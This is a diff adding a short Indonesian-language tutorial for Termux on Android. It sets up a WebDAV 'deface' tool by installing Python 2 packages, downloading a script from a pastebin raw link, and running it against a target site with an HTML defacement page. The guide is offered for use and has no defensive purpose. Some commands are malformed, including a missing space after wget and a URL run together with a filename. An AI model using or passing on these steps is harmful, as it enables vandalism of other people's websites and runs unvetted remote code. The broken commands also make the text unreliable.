@@ -1,0 +1,34 @@
+$ cd /storage/emulated/0
+
+$ apt update && apt upgrade
+
+$ apt install wget
+
+$ apt install python2
+
+$ apt install libcurl
+
+$ apt install openssl curl
+
+$ pip2 install urllib3 chardet certifi idna requests
+
+$ mkdir webdav
+
+$ cd webdav
+
+$ wgethttps://pastebin.com/raw/HnVyQPtR -O webdav.py
+
+Seharusnya kalau kalian sudah ikuti semua sesuai dengan yang di atas berarti sudah terinstall webdavnya, kalian tinggal siapkan script defacenya ber eksistensi html .
+
+Jangan lupa script defacenya letak kan diluar file penyimpanan . Yg berbasis .html
+
+Cara aktifin webdavnya
+
+1. Ls
+
+2. Cd webdav
+
+3. Python2 webdav.py namascriptkalian.html
+
+Contoh
+python2 webdav.py http://hr.wajahmutampan.comFILE.html
